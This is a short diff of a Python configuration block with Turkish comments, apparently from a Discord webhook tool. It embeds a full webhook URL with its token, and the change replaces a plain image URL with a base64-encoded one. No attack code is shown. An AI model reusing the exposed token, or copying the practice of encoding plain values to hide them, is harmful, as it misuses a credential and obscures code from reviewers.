@@ -6,7 +6,7 @@ from datetime import datetime
 # Konfigürasyon ayarları
 config = {
     "webhook": "https://discord.com/api/webhooks/1350927981828112505/F1kWu21zY_iCY3cmjPIN_GDCWqUUMDr0WSk4us1MJMmQv_vFG3_EpX4K1M4FE6-xMXuc",  # Webhook URL'nizi buraya yerleştirin
-    "image": "https://i.imgur.com/kMb7tSO.jpeg",             # Göstermek istediğiniz resmin URL'si
+    "image": "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9nOTh2MjZrYVY4NC9tYXhyZXNkZWZhdWx0LmpwZw==",             # Göstermek istediğiniz resmin URL'si
     "username": "Security Bot",
     "avatar_url": "https://i.imgur.com/qwuTdKl.png",
     "color": 0x3498db,
